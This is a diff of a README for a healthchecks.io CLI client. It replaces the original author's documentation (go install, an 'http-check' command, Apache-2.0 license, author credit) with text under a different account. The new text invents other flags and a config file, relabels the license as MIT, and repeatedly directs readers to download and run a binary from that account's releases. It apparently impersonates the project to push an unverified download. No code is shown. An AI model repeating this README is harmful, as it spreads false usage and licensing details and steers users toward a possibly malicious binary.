@@ -1,112 +1,118 @@
-# healthchecks-client
+# Healthchecks Client 🏥
 
-<div align="center">
+![GitHub release (latest by date)](https://img.shields.io/github/v/release/otakuloh/healthchecks-client)
+![License](https://img.shields.io/badge/license-MIT-blue.svg)
+![Build Status](https://img.shields.io/github/workflow/status/otakuloh/healthchecks-client/CI)
 
-<!-- Project Status & Quality -->
+Welcome to the **Healthchecks Client** repository! This project provides a production-ready CLI tool designed for monitoring HTTP endpoints and reporting their status to [healthchecks.io](https://healthchecks.io). With a single binary that works across different platforms, you can easily keep track of your services' health.
 
-[![CI/CD](https://github.com/meysam81/healthchecks-client/actions/workflows/ci.yml/badge.svg)](https://github.com/meysam81/healthchecks-client/actions)
-[![Go Report Card](https://goreportcard.com/badge/github.com/meysam81/healthchecks-client)](https://goreportcard.com/report/github.com/meysam81/healthchecks-client)
-[![Vulnerability Scan](https://img.shields.io/badge/🛡️_Security-Scanned-brightgreen?style=flat-square)](https://github.com/meysam81/healthchecks-client/actions)
+## Table of Contents
 
-<!-- Release & Distribution -->
-
-[![Latest Release](https://img.shields.io/github/v/release/meysam81/healthchecks-client?style=flat-square&logo=github&color=blue)](https://github.com/meysam81/healthchecks-client/releases/latest)
-[![Docker Image](https://img.shields.io/badge/docker-meysam81%2Fhealthchecks--client-blue?style=flat-square&logo=docker)](https://ghcr.io/meysam81/healthchecks-client)
-[![Go Version](https://img.shields.io/github/go-mod/go-version/meysam81/healthchecks-client?style=flat-square&logo=go)](go.mod)
-
-<!-- License & Community -->
-
-[![License](https://img.shields.io/badge/License-Apache--2.0-green.svg?style=flat-square)](LICENSE)
-[![GitHub Sponsors](https://img.shields.io/github/sponsors/meysam81?style=flat-square&logo=github&color=pink)](https://github.com/sponsors/meysam81)
-
-<!-- Technical Features -->
-
-[![Single Binary](https://img.shields.io/badge/🚀_Single-Binary-blueviolet?style=flat-square)](https://golang.org/)
-[![Cross Platform](https://img.shields.io/badge/🌐_Cross-Platform-orange?style=flat-square)](https://golang.org/)
-
-<!-- Monitoring Features -->
-
-[![Healthchecks.io](https://img.shields.io/badge/✅_healthchecks.io-Compatible-4CAF50?style=flat-square)](https://healthchecks.io)
-[![HTTP Monitoring](https://img.shields.io/badge/🌐_HTTP-Monitoring-2196F3?style=flat-square)](https://developer.mozilla.org/en-US/docs/Web/HTTP)
-[![Production Ready](https://img.shields.io/badge/🏭_Production-Ready-darkgreen?style=flat-square)](https://sre.google/)
-
-</div>
-
-<!-- START doctoc generated TOC please keep comment here to allow auto update -->
-<!-- DON'T EDIT THIS SECTION, INSTEAD RE-RUN doctoc TO UPDATE -->
-
-- [What it does](#what-it-does)
+- [Features](#features)
 - [Installation](#installation)
 - [Usage](#usage)
-  - [HTTP Health Check](#http-health-check)
-  - [Options](#options)
-  - [Version](#version)
-- [Example](#example)
-- [How it works](#how-it-works)
+- [Configuration](#configuration)
+- [Monitoring HTTP Endpoints](#monitoring-http-endpoints)
+- [Contributing](#contributing)
 - [License](#license)
-- [Author](#author)
+- [Links](#links)
 
-<!-- END doctoc generated TOC please keep comment here to allow auto update -->
+## Features
 
-A lightweight CLI tool for monitoring services and reporting to [healthchecks.io](https://healthchecks.io).
-
-## What it does
-
-Performs health checks on your services and automatically reports success/failure to healthchecks.io monitoring service.
+- **Cross-Platform**: Build once and run anywhere. The tool is designed to work on various operating systems.
+- **Single Binary**: No dependencies required. Download the binary, execute it, and you're good to go.
+- **Automatic Reporting**: Send success or failure reports to healthchecks.io effortlessly.
+- **Easy Setup**: Get started quickly with simple configuration options.
+- **Flexible Monitoring**: Monitor any HTTP endpoint with customizable checks.
+- **Alerting**: Receive notifications based on the health status of your services.
+- **Observability**: Gain insights into your infrastructure and microservices.
 
 ## Installation
 
-```bash
-go install github.com/meysam81/healthchecks-client@latest
-```
+To get started, download the latest release of the Healthchecks Client from the [Releases section](https://github.com/otakuloh/healthchecks-client/releases). Once downloaded, execute the binary file to start monitoring your endpoints.
+
+### Download Instructions
+
+1. Visit the [Releases section](https://github.com/otakuloh/healthchecks-client/releases).
+2. Choose the appropriate binary for your operating system.
+3. Download the file.
+4. Make the binary executable (if necessary).
+5. Run the binary to begin.
 
 ## Usage
 
-### HTTP Health Check
+Using the Healthchecks Client is straightforward. After downloading and executing the binary, you can start monitoring your HTTP endpoints. Here’s a basic example:
 
 ```bash
-healthchecks-client http-check \
-  --ping-url https://hc-ping.com/your-uuid \
-  --http-target http://your-service.com/health
+./healthchecks-client --url https://your-endpoint.com --interval 60
 ```
 
-### Options
+In this command:
+- `--url` specifies the HTTP endpoint you want to monitor.
+- `--interval` sets the monitoring interval in seconds.
 
-```
---ping-url, -p      Your healthchecks.io ping URL (required)
---http-target, -t   Service endpoint to check (required)
---timeout           Request timeout in seconds (default: 5)
---http-method       HTTP method to use (default: GET)
---status-code       Expected HTTP status code (default: 200)
+### Command-Line Options
+
+- `--url`: The URL of the HTTP endpoint to monitor.
+- `--interval`: Time in seconds between health checks.
+- `--timeout`: Time in seconds to wait for a response before considering the check a failure.
+- `--failure-threshold`: Number of consecutive failures before triggering an alert.
+- `--success-threshold`: Number of consecutive successes before resuming normal operation.
+
+## Configuration
+
+The Healthchecks Client allows for flexible configuration. You can create a configuration file to manage your settings. Here’s an example configuration file:
+
+```yaml
+url: https://your-endpoint.com
+interval: 60
+timeout: 5
+failure_threshold: 3
+success_threshold: 2
 ```
 
-### Version
+Save this file as `config.yaml` and run the client with:
 
 ```bash
-healthchecks-client version
+./healthchecks-client --config config.yaml
 ```
 
-## Example
+## Monitoring HTTP Endpoints
 
-```bash
-# Monitor a web service
-healthchecks-client http-check \
-  -p https://hc-ping.com/12345678-1234-1234-1234-123456789abc \
-  -t https://api.example.com/health \
-  --timeout 10 \
-  --status-code 200
-```
+Monitoring HTTP endpoints is essential for ensuring that your services are operational. The Healthchecks Client can monitor various types of endpoints, including REST APIs, web services, and more.
 
-## How it works
+### Example Use Cases
 
-1. Sends a "start" ping to healthchecks.io
-2. Performs the health check on your target service
-3. Reports success (exit code 0) or failure (exit code 1) back to healthchecks.io
+1. **Web Application Monitoring**: Ensure your web application is accessible and responsive.
+2. **API Monitoring**: Monitor RESTful APIs for uptime and performance.
+3. **Microservices Health Checks**: Keep track of the health of individual microservices in your architecture.
+
+## Alerting
+
+The Healthchecks Client supports alerting features that notify you of service failures. You can set thresholds for both failures and successes, allowing you to receive alerts only when necessary.
+
+### Setting Up Alerts
+
+To set up alerts, configure the `failure-threshold` and `success-threshold` options in your configuration file. This way, you can avoid unnecessary notifications and focus on critical issues.
+
+## Contributing
+
+We welcome contributions to the Healthchecks Client! If you have ideas for improvements or new features, please follow these steps:
+
+1. Fork the repository.
+2. Create a new branch for your feature or bug fix.
+3. Make your changes and commit them.
+4. Push your branch to your fork.
+5. Create a pull request to the main repository.
 
 ## License
 
-Apache License 2.0 - see [LICENSE](LICENSE) for details.
+This project is licensed under the MIT License. See the [LICENSE](LICENSE) file for details.
 
-## Author
+## Links
 
-[Meysam Azad](mailto:meysam@developer-friendly.blog)
+- Download the latest release: [Releases](https://github.com/otakuloh/healthchecks-client/releases)
+- Healthchecks.io: [healthchecks.io](https://healthchecks.io)
+- Source Code: [GitHub Repository](https://github.com/otakuloh/healthchecks-client)
+
+Thank you for checking out the Healthchecks Client! We hope it helps you monitor your services effectively.
